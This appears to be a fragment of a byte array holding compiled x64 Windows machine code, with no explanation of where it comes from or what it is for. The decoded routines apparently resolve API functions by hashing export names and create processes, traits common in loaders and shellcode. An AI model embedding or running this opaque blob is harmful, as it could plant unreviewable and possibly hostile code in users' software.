	0x66, 0x89, 0x38, 0x48, 0x8D, 0x40, 0x02, 0x0F, 0xB7, 0x3C, 0x01, 0x66, 0x85, 0xFF, 0x75, 0xF0,
	0x66, 0x89, 0x18, 0x48, 0x8D, 0x7D, 0xB0, 0x33, 0xC0, 0xB9, 0x68, 0x00, 0x00, 0x00, 0xF3, 0xAA,
	0xC7, 0x45, 0xB0, 0x68, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x48, 0x60, 0x48, 0x8B, 0x51, 0x20, 0x48, 0x8B, 0x82, 0xD8, 0x00, 0x00, 0x00, 0x48,
	0x89, 0x45, 0xB8, 0x48, 0x8B, 0x82, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xC0, 0x48, 0x8B,
	0x82, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xC8, 0x8B, 0x82, 0x88, 0x00, 0x00, 0x00, 0x89,
	0x45, 0xD0, 0x8B, 0x82, 0x8C, 0x00, 0x00, 0x00, 0x89, 0x45, 0xD4, 0x8B, 0x82, 0x90, 0x00, 0x00,
	0x00, 0x89, 0x45, 0xD8, 0x8B, 0x82, 0x94, 0x00, 0x00, 0x00, 0x89, 0x45, 0xDC, 0x8B, 0x82, 0x98,
	0x00, 0x00, 0x00, 0x89, 0x45, 0xE0, 0x8B, 0x82, 0x9C, 0x00, 0x00, 0x00, 0x89, 0x45, 0xE4, 0x8B,
	0x82, 0xA0, 0x00, 0x00, 0x00, 0x89, 0x45, 0xE8, 0x8B, 0x8A, 0xA4, 0x00, 0x00, 0x00, 0x89, 0x4D,
	0xEC, 0x0F, 0xB7, 0x82, 0xA8, 0x00, 0x00, 0x00, 0x66, 0x89, 0x45, 0xF0, 0x0F, 0xB7, 0x82, 0xE0,
	0x00, 0x00, 0x00, 0x66, 0x89, 0x45, 0xF2, 0x48, 0x8B, 0x82, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x45, 0xF8, 0xF7, 0xC1, 0x00, 0x03, 0x00, 0x00, 0x74, 0x18, 0x48, 0x8B, 0x42, 0x20, 0x48, 0x89,
	0x45, 0x00, 0x48, 0x8B, 0x42, 0x28, 0x48, 0x89, 0x45, 0x08, 0x48, 0x8B, 0x42, 0x30, 0x48, 0x89,
	0x45, 0x10, 0x4D, 0x85, 0xFF, 0x74, 0x58, 0x8B, 0x85, 0xF0, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x74,
	0x4E, 0x8B, 0xF8, 0x4C, 0x8D, 0x80, 0x00, 0x10, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30,
	0x00, 0x00, 0x00, 0xBA, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30,
	0xFF, 0x15, 0x72, 0x17, 0x00, 0x00, 0x48, 0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x6B, 0x01,
	0x00, 0x00, 0x44, 0x8B, 0xC7, 0x89, 0x5C, 0x24, 0x60, 0x49, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0x41,
	0xBE, 0x01, 0x00, 0x00, 0x00, 0xE8, 0xE6, 0x07, 0x00, 0x00, 0xE9, 0x4E, 0x01, 0x00, 0x00, 0x33,
	0xC0, 0x48, 0x8D, 0xBD, 0x80, 0x02, 0x00, 0x00, 0xB9, 0x10, 0x04, 0x00, 0x00, 0xF3, 0xAA, 0x0F,
	0xB7, 0x4D, 0x70, 0x48, 0x8D, 0x85, 0x80, 0x02, 0x00, 0x00, 0x66, 0x85, 0xC9, 0x74, 0x21, 0x48,
	0x8D, 0x55, 0x70, 0x48, 0x8D, 0xBD, 0x80, 0x02, 0x00, 0x00, 0x48, 0x2B, 0xD7, 0x0F, 0x1F, 0x00,
	0x66, 0x89, 0x08, 0x48, 0x83, 0xC0, 0x02, 0x0F, 0xB7, 0x0C, 0x02, 0x66, 0x85, 0xC9, 0x75, 0xF0,
	0x66, 0x89, 0x18, 0x48, 0x8D, 0x85, 0x80, 0x02, 0x00, 0x00, 0x66, 0x39, 0x9D, 0x80, 0x02, 0x00,
	0x00, 0x74, 0x09, 0x48, 0x83, 0xC0, 0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x48, 0x8D, 0x15, 0x05,
	0x18, 0x00, 0x00, 0xB9, 0x63, 0x00, 0x00, 0x00, 0x48, 0x2B, 0xD0, 0x0F, 0x1F, 0x44, 0x00, 0x00,
	0x66, 0x89, 0x08, 0x48, 0x8D, 0x40, 0x02, 0x0F, 0xB7, 0x0C, 0x02, 0x66, 0x85, 0xC9, 0x75, 0xF0,
	0x66, 0x89, 0x18, 0x48, 0x8D, 0x85, 0x80, 0x02, 0x00, 0x00, 0x66, 0x39, 0x9D, 0x80, 0x02, 0x00,
	0x00, 0x74, 0x09, 0x48, 0x83, 0xC0, 0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x48, 0x8D, 0x0D, 0xC9,
	0x17, 0x00, 0x00, 0x48, 0x2B, 0xC8, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x66, 0x44, 0x89, 0x00, 0x48, 0x8D, 0x40, 0x02, 0x44, 0x0F, 0xB7, 0x04, 0x01, 0x66, 0x45, 0x85,
	0xC0, 0x75, 0xED, 0x66, 0x89, 0x18, 0x48, 0x8D, 0x85, 0x80, 0x02, 0x00, 0x00, 0x66, 0x39, 0x9D,
	0x80, 0x02, 0x00, 0x00, 0x74, 0x09, 0x48, 0x83, 0xC0, 0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x48,
	0x8D, 0x15, 0x8A, 0x17, 0x00, 0x00, 0xB9, 0x64, 0x00, 0x00, 0x00, 0x48, 0x2B, 0xD0, 0x66, 0x90,
	0x66, 0x89, 0x08, 0x48, 0x8D, 0x40, 0x02, 0x0F, 0xB7, 0x0C, 0x02, 0x66, 0x85, 0xC9, 0x75, 0xF0,
	0x66, 0x89, 0x18, 0x48, 0x8D, 0x85, 0x80, 0x02, 0x00, 0x00, 0x66, 0x39, 0x9D, 0x80, 0x02, 0x00,
	0x00, 0x74, 0x09, 0x48, 0x83, 0xC0, 0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x48, 0x8D, 0x15, 0x55,
	0x17, 0x00, 0x00, 0xB9, 0x2E, 0x00, 0x00, 0x00, 0x48, 0x2B, 0xD0, 0x0F, 0x1F, 0x44, 0x00, 0x00,
	0x66, 0x89, 0x08, 0x48, 0x8D, 0x40, 0x02, 0x0F, 0xB7, 0x0C, 0x02, 0x66, 0x85, 0xC9, 0x75, 0xF0,
	0x66, 0x89, 0x18, 0x4C, 0x8D, 0xA5, 0x80, 0x02, 0x00, 0x00, 0x48, 0x8B, 0xF3, 0xB8, 0x05, 0x00,
	0x00, 0x00, 0xC7, 0x45, 0xEC, 0x01, 0x00, 0x00, 0x00, 0x66, 0x89, 0x45, 0xF0, 0x48, 0x8D, 0x7D,
	0x20, 0x33, 0xC0, 0xB9, 0x18, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8B, 0x4D, 0x88, 0x48, 0x8D,
	0x05, 0x13, 0x17, 0x00, 0x00, 0x45, 0x85, 0xED, 0x4C, 0x8B, 0xC6, 0x49, 0x8B, 0xD4, 0x48, 0x0F,
	0x44, 0x45, 0xC0, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x45, 0xC0, 0x48, 0x8D, 0x45, 0x20, 0x48, 0x89,
	0x44, 0x24, 0x50, 0x48, 0x8D, 0x45, 0xB0, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D, 0x45, 0x70,
	0x48, 0x89, 0x44, 0x24, 0x40, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x89, 0x5C, 0x24, 0x38, 0x89, 0x44,
	0x24, 0x30, 0x89, 0x5C, 0x24, 0x28, 0x48, 0x89, 0x5C, 0x24, 0x20, 0xFF, 0x95, 0xD0, 0x06, 0x00,
	0x00, 0x48, 0x8B, 0xBC, 0x24, 0x90, 0x07, 0x00, 0x00, 0x8B, 0xD8, 0x85, 0xC0, 0x74, 0x14, 0x48,
	0x8B, 0x4D, 0x20, 0xFF, 0x15, 0xCF, 0x15, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x28, 0xFF, 0x15, 0xC5,
	0x15, 0x00, 0x00, 0x45, 0x85, 0xF6, 0x74, 0x1C, 0x65, 0x48, 0x8B, 0x0C, 0x25, 0x30, 0x00, 0x00,
	0x00, 0x4C, 0x8B, 0xC6, 0x33, 0xD2, 0x48, 0x8B, 0x49, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15,
	0xCC, 0x15, 0x00, 0x00, 0x48, 0x8B, 0xB4, 0x24, 0xE8, 0x07, 0x00, 0x00, 0x45, 0x85, 0xED, 0x74,
	0x1E, 0x48, 0x8B, 0x4D, 0x80, 0x48, 0x85, 0xC9, 0x74, 0x06, 0xFF, 0x15, 0x88, 0x15, 0x00, 0x00,
	0x48, 0x8B, 0x4D, 0x88, 0x48, 0x85, 0xC9, 0x74, 0x06, 0xFF, 0x15, 0x79, 0x15, 0x00, 0x00, 0x8B,
	0xC3, 0x48, 0x81, 0xC4, 0x98, 0x07, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
	0x5B, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8B, 0xC4, 0x53, 0x57, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x70, 0x33, 0xFF, 0x66, 0xC7, 0x40,
	0x14, 0x00, 0x05, 0x4C, 0x8B, 0xF1, 0x48, 0x89, 0x78, 0x18, 0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF,
	0xFF, 0x89, 0x78, 0x08, 0x4C, 0x8D, 0x40, 0x18, 0x48, 0x89, 0x78, 0x20, 0xBA, 0x08, 0x00, 0x00,
	0x00, 0x89, 0x78, 0x10, 0xFF, 0x15, 0xAE, 0x14, 0x00, 0x00, 0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88,
	0x35, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24,
	0x90, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xC0, 0xBA,
	0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xD6, 0x14, 0x00, 0x00, 0x8B, 0xD8, 0x3D, 0x23, 0x00, 0x00,
	0xC0, 0x0F, 0x85, 0xF4, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,
	0xBA, 0x08, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x74,
	0x24, 0x68, 0x48, 0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x58, 0x14, 0x00, 0x00,
	0x48, 0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xB5, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x8C, 0x24,
	0x90, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24,
	0xA0, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC6, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
	0x20, 0xFF, 0x15, 0x69, 0x14, 0x00, 0x00, 0x8B, 0xD8, 0x85, 0xC0, 0x78, 0x66, 0x48, 0x8D, 0x84,
	0x24, 0xA8, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8D, 0x8C,
	0x24, 0x98, 0x00, 0x00, 0x00, 0x89, 0x7C, 0x24, 0x48, 0x41, 0xB8, 0x12, 0x00, 0x00, 0x00, 0x89,
	0x7C, 0x24, 0x40, 0xB2, 0x01, 0x89, 0x7C, 0x24, 0x38, 0x89, 0x7C, 0x24, 0x30, 0x89, 0x7C, 0x24,
	0x28, 0x89, 0x7C, 0x24, 0x20, 0xFF, 0x15, 0x1D, 0x14, 0x00, 0x00, 0x8B, 0xD8, 0x85, 0xC0, 0x78,
	0x22, 0x48, 0x8B, 0x94, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0xFF, 0x15, 0x5E, 0x14,
	0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0xF8, 0xFF, 0x15, 0x1D,
	0x14, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC6, 0x33,
	0xD2, 0x48, 0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x21, 0x14, 0x00, 0x00, 0xEB,
	0x05, 0xBB, 0x9A, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0x74, 0x24, 0x68, 0x48, 0x8B, 0x8C, 0x24, 0xA0,
	0x00, 0x00, 0x00, 0xFF, 0x15, 0xDF, 0x13, 0x00, 0x00, 0x8B, 0xC3, 0x4D, 0x85, 0xF6, 0x74, 0x03,
	0x41, 0x89, 0x3E, 0x48, 0x83, 0xC4, 0x70, 0x41, 0x5E, 0x5F, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8B, 0xC1, 0x48, 0x85, 0xC9, 0x75, 0x01, 0xC3, 0x66, 0x83, 0x39, 0x00, 0x74, 0x0B, 0x90,
	0x48, 0x83, 0xC1, 0x02, 0x66, 0x83, 0x39, 0x00, 0x75, 0xF6, 0x48, 0x2B, 0xC8, 0x48, 0xD1, 0xF9,
	0x48, 0x8B, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x4C, 0x8B, 0xDC, 0x53, 0x48, 0x83, 0xEC, 0x60, 0x48, 0x8D, 0x05, 0x79, 0x14, 0x00, 0x00, 0xC7,
	0x44, 0x24, 0x40, 0x18, 0x00, 0x1A, 0x00, 0x49, 0x89, 0x43, 0xE0, 0x4D, 0x8D, 0x4B, 0x18, 0x48,
	0x8D, 0x05, 0x82, 0x14, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x30, 0x18, 0x00, 0x1A, 0x00, 0x33, 0xDB,
	0x49, 0x89, 0x43, 0xD0, 0x4D, 0x8D, 0x43, 0xD8, 0x49, 0x89, 0x5B, 0x10, 0x33, 0xD2, 0x33, 0xC9,
	0xFF, 0x15, 0xBA, 0x13, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xFE, 0x00, 0x00, 0x00, 0x48, 0x8D,
	0x44, 0x24, 0x78, 0x45, 0x33, 0xC0, 0x4C, 0x8D, 0x4C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20,
	0x33, 0xD2, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x9B, 0x13, 0x00, 0x00, 0x85, 0xC0, 0x79,
	0x1C, 0x4C, 0x8D, 0x4C, 0x24, 0x78, 0x33, 0xD2, 0x4C, 0x8D, 0x44, 0x24, 0x30, 0x33, 0xC9, 0xFF,
	0x15, 0x7B, 0x13, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xBF, 0x00, 0x00, 0x00, 0x48, 0x89, 0x7C,
	0x24, 0x50, 0x4C, 0x8D, 0x4C, 0x24, 0x70, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0x45, 0x33, 0xC0, 0x48,
	0x8B, 0xCF, 0x89, 0x5C, 0x24, 0x70, 0xB2, 0x01, 0xFF, 0x15, 0x62, 0x12, 0x00, 0x00, 0x48, 0x85,
	0xC0, 0x0F, 0x84, 0x87, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x48, 0x20, 0x44, 0x8B, 0xC3, 0x44, 0x8B,
	0x58, 0x24, 0x4C, 0x03, 0xCF, 0x44, 0x8B, 0x50, 0x18, 0x4C, 0x03, 0xDF, 0x48, 0x89, 0x74, 0x24,
	0x58, 0x8B, 0x70, 0x1C, 0x48, 0x03, 0xF7, 0x45, 0x85, 0xD2, 0x74, 0x5D, 0x0F, 0x1F, 0x40, 0x00,
	0x41, 0x8B, 0x11, 0x8B, 0xC3, 0x48, 0x03, 0xD7, 0x0F, 0xB6, 0x0A, 0x84, 0xC9, 0x74, 0x1D, 0x90,
	0x0F, 0xBE, 0xC9, 0x48, 0x8D, 0x52, 0x01, 0x33, 0xC1, 0x0F, 0xB6, 0x0A, 0xC1, 0xC0, 0x03, 0xFF,
	0xC0, 0x84, 0xC9, 0x75, 0xEB, 0x3D, 0x3C, 0xE9, 0x5B, 0xB7, 0x74, 0x1F, 0x41, 0xFF, 0xC0, 0x49,
	0x83, 0xC1, 0x04, 0x45, 0x3B, 0xC2, 0x72, 0xC8, 0x48, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x8B, 0xC3,
	0x48, 0x8B, 0x7C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x60, 0x5B, 0xC3, 0x41, 0x8B, 0xC0, 0x41, 0x0F,
	0xB7, 0x0C, 0x43, 0x8B, 0x1C, 0x8E, 0x48, 0x03, 0xDF, 0x48, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x8B,
	0x7C, 0x24, 0x50, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x60, 0x5B, 0xC3, 0x33, 0xC0, 0x48, 0x83,
	0xC4, 0x60, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x20, 0x57, 0x48, 0x81, 0xEC, 0x70, 0x03, 0x00, 0x00, 0x33, 0xC0, 0x48,
	0x8D, 0x7C, 0x24, 0x70, 0x33, 0xDB, 0x48, 0x8D, 0x15, 0xA3, 0x12, 0x00, 0x00, 0xB9, 0x00, 0x01,
	0x00, 0x00, 0x89, 0x9C, 0x24, 0x80, 0x03, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D, 0xBC, 0x24, 0x70,
	0x01, 0x00, 0x00, 0xB9, 0x5C, 0x00, 0x00, 0x00, 0x48, 0x2B, 0xD7, 0x48, 0x8D, 0x84, 0x24, 0x70,
	0x01, 0x00, 0x00, 0x0F, 0x1F, 0x40, 0x00, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x66, 0x89, 0x08, 0x48, 0x8D, 0x40, 0x02, 0x0F, 0xB7, 0x0C, 0x02, 0x66, 0x85, 0xC9, 0x75, 0xF0,
	0xB9, 0x31, 0x61, 0x00, 0x00, 0x66, 0x89, 0x18, 0x48, 0x8D, 0x54, 0x24, 0x70, 0xE8, 0x1E, 0xF1,
	0xFF, 0xFF, 0x48, 0x8D, 0x84, 0x24, 0x70, 0x01, 0x00, 0x00, 0x66, 0x39, 0x9C, 0x24, 0x70, 0x01,
	0x00, 0x00, 0x74, 0x09, 0x48, 0x83, 0xC0, 0x02, 0x66, 0x39, 0x18, 0x75, 0xF7, 0x0F, 0xB7, 0x4C,
	0x24, 0x70, 0x66, 0x85, 0xC9, 0x74, 0x19, 0x48, 0x8D, 0x54, 0x24, 0x70, 0x48, 0x2B, 0xD0, 0x90,
	0x66, 0x89, 0x08, 0x48, 0x83, 0xC0, 0x02, 0x0F, 0xB7, 0x0C, 0x02, 0x66, 0x85, 0xC9, 0x75, 0xF0,
	0x48, 0x8D, 0x94, 0x24, 0x70, 0x01, 0x00, 0x00, 0x66, 0x89, 0x18, 0x48, 0x8D, 0x4C, 0x24, 0x30,
	0xFF, 0x15, 0x3A, 0x11, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x30, 0xC7, 0x44, 0x24, 0x40, 0x30,
	0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x50, 0x45, 0x33, 0xC9, 0x48, 0x89,
	0x5C, 0x24, 0x48, 0x4C, 0x8D, 0x44, 0x24, 0x40, 0xC7, 0x44, 0x24, 0x58, 0x40, 0x00, 0x00, 0x00,
	0xBA, 0x01, 0x00, 0x1F, 0x00, 0x48, 0x8D, 0x0D, 0xB4, 0x20, 0x00, 0x00, 0xF3, 0x0F, 0x7F, 0x44,
	0x24, 0x60, 0xFF, 0x15, 0x40, 0x11, 0x00, 0x00, 0x85, 0xC0, 0x79, 0x09, 0x33, 0xC9, 0xFF, 0x15,
	0x84, 0x10, 0x00, 0x00, 0xCC, 0x33, 0xC0, 0x48, 0x89, 0xAC, 0x24, 0x88, 0x03, 0x00, 0x00, 0x48,
	0x8D, 0x3D, 0xAA, 0x20, 0x00, 0x00, 0x48, 0x89, 0xB4, 0x24, 0x90, 0x03, 0x00, 0x00, 0xB9, 0x34,
	0x08, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D, 0x0D, 0x94, 0x20, 0x00, 0x00, 0xE8, 0x1F, 0xF3, 0xFF,
	0xFF, 0x8B, 0xF0, 0x85, 0xC0, 0x74, 0x1C, 0x48, 0x8D, 0x1D, 0x8E, 0x20, 0x00, 0x00, 0x48, 0x8B,
	0xCB, 0xE8, 0x0A, 0xFD, 0xFF, 0xFF, 0x8B, 0x2D, 0x78, 0x20, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x03,
	0xFF, 0xEB, 0x04, 0x8B, 0xFB, 0x8B, 0xEB, 0x48, 0x8D, 0x8C, 0x24, 0x80, 0x03, 0x00, 0x00, 0xE8,
	0x5C, 0xFB, 0xFF, 0xFF, 0xE8, 0x27, 0xFD, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x19, 0x8B, 0x94,
	0x24, 0x80, 0x03, 0x00, 0x00, 0x4C, 0x8B, 0xCB, 0x44, 0x8B, 0xC5, 0x89, 0x7C, 0x24, 0x20, 0x48,
	0x8B, 0xC8, 0xE8, 0x59, 0xF5, 0xFF, 0xFF, 0x48, 0x8B, 0xAC, 0x24, 0x88, 0x03, 0x00, 0x00, 0x85,
	0xF6, 0x48, 0x8B, 0xB4, 0x24, 0x90, 0x03, 0x00, 0x00, 0x74, 0x0C, 0x48, 0x8D, 0x0D, 0x48, 0x26,
	0x00, 0x00, 0xE8, 0x79, 0xF4, 0xFF, 0xFF, 0xE8, 0x14, 0xF5, 0xFF, 0xFF, 0x48, 0x8B, 0x0D, 0xED,
	0x1F, 0x00, 0x00, 0xFF, 0x15, 0x5F, 0x10, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15, 0xC7, 0x0F, 0x00,
	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x83, 0xEC, 0x28, 0x83, 0xFA, 0x01, 0x74, 0x0A, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83,
	0xC4, 0x28, 0xC3, 0xFF, 0x15, 0x97, 0x0F, 0x00, 0x00, 0xE8, 0x02, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC,
	0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0xFF, 0x15, 0x94, 0x0F, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF,
	0x15, 0x9B, 0x10, 0x00, 0x00, 0xB9, 0x00, 0x20, 0x00, 0x00, 0x66, 0x85, 0x48, 0x16, 0x74, 0x05,
	0x48, 0x83, 0xC4, 0x28, 0xC3, 0xE8, 0xD6, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x57, 0x56, 0x48, 0x8B, 0xF9, 0x48, 0x8B, 0xF2, 0x49, 0x8B, 0xC8, 0xF3, 0xA4, 0x5E, 0x5F, 0xC3,
	0x48, 0x8B, 0xC1, 0x4C, 0x8D, 0x15, 0x26, 0xDF, 0xFF, 0xFF, 0x49, 0x83, 0xF8, 0x0F, 0x0F, 0x87,
	0x0C, 0x01, 0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x47, 0x8B, 0x8C, 0x82, 0x10, 0x32, 0x00, 0x00, 0x4D, 0x03, 0xCA, 0x41, 0xFF, 0xE1, 0xC3, 0x90,
	0x4C, 0x8B, 0x02, 0x8B, 0x4A, 0x08, 0x44, 0x0F, 0xB7, 0x4A, 0x0C, 0x44, 0x0F, 0xB6, 0x52, 0x0E,
	0x4C, 0x89, 0x00, 0x89, 0x48, 0x08, 0x66, 0x44, 0x89, 0x48, 0x0C, 0x44, 0x88, 0x50, 0x0E, 0xC3,
	0x4C, 0x8B, 0x02, 0x0F, 0xB7, 0x4A, 0x08, 0x44, 0x0F, 0xB6, 0x4A, 0x0A, 0x4C, 0x89, 0x00, 0x66,
	0x89, 0x48, 0x08, 0x44, 0x88, 0x48, 0x0A, 0xC3, 0x0F, 0xB7, 0x0A, 0x66, 0x89, 0x08, 0xC3, 0x90,
	0x8B, 0x0A, 0x44, 0x0F, 0xB7, 0x42, 0x04, 0x44, 0x0F, 0xB6, 0x4A, 0x06, 0x89, 0x08, 0x66, 0x44,
	0x89, 0x40, 0x04, 0x44, 0x88, 0x48, 0x06, 0xC3, 0x4C, 0x8B, 0x02, 0x8B, 0x4A, 0x08, 0x44, 0x0F,
	0xB7, 0x4A, 0x0C, 0x4C, 0x89, 0x00, 0x89, 0x48, 0x08, 0x66, 0x44, 0x89, 0x48, 0x0C, 0xC3, 0x0F,
	0xB7, 0x0A, 0x44, 0x0F, 0xB6, 0x42, 0x02, 0x66, 0x89, 0x08, 0x44, 0x88, 0x40, 0x02, 0xC3, 0x90,
	0x4C, 0x8B, 0x02, 0x8B, 0x4A, 0x08, 0x44, 0x0F, 0xB6, 0x4A, 0x0C, 0x4C, 0x89, 0x00, 0x89, 0x48,
	0x08, 0x44, 0x88, 0x48, 0x0C, 0xC3, 0x4C, 0x8B, 0x02, 0x0F, 0xB7, 0x4A, 0x08, 0x4C, 0x89, 0x00,
	0x66, 0x89, 0x48, 0x08, 0xC3, 0x4C, 0x8B, 0x02, 0x0F, 0xB6, 0x4A, 0x08, 0x4C, 0x89, 0x00, 0x88,
	0x48, 0x08, 0xC3, 0x4C, 0x8B, 0x02, 0x8B, 0x4A, 0x08, 0x4C, 0x89, 0x00, 0x89, 0x48, 0x08, 0xC3,
	0x8B, 0x0A, 0x44, 0x0F, 0xB7, 0x42, 0x04, 0x89, 0x08, 0x66, 0x44, 0x89, 0x40, 0x04, 0xC3, 0x8B,
	0x0A, 0x44, 0x0F, 0xB6, 0x42, 0x04, 0x89, 0x08, 0x44, 0x88, 0x40, 0x04, 0xC3, 0x48, 0x8B, 0x0A,
	0x48, 0x89, 0x08, 0xC3, 0x0F, 0xB6, 0x0A, 0x88, 0x08, 0xC3, 0x8B, 0x0A, 0x89, 0x08, 0xC3, 0x90,
	0x49, 0x83, 0xF8, 0x20, 0x77, 0x17, 0xF3, 0x0F, 0x6F, 0x0A, 0xF3, 0x42, 0x0F, 0x6F, 0x54, 0x02,
	0xF0, 0xF3, 0x0F, 0x7F, 0x09, 0xF3, 0x42, 0x0F, 0x7F, 0x54, 0x01, 0xF0, 0xC3, 0x4E, 0x8D, 0x0C,
	0x02, 0x48, 0x3B, 0xCA, 0x4C, 0x0F, 0x46, 0xC9, 0x49, 0x3B, 0xC9, 0x0F, 0x82, 0x3F, 0x04, 0x00,
	0x00, 0x83, 0x3D, 0xE0, 0x1D, 0x00, 0x00, 0x03, 0x0F, 0x82, 0xE2, 0x02, 0x00, 0x00, 0x49, 0x81,
	0xF8, 0x00, 0x20, 0x00, 0x00, 0x76, 0x16, 0x49, 0x81, 0xF8, 0x00, 0x00, 0x18, 0x00, 0x77, 0x0D,
	0xF6, 0x05, 0xE5, 0x1D, 0x00, 0x00, 0x02, 0x0F, 0x85, 0x73, 0xFE, 0xFF, 0xFF, 0xC5, 0xFE, 0x6F,
	0x02, 0xC4, 0xA1, 0x7E, 0x6F, 0x6C, 0x02, 0xE0, 0x49, 0x81, 0xF8, 0x00, 0x01, 0x00, 0x00, 0x0F,
	0x86, 0xC3, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC9, 0x49, 0x83, 0xE1, 0x1F, 0x49, 0x83, 0xE9, 0x20,
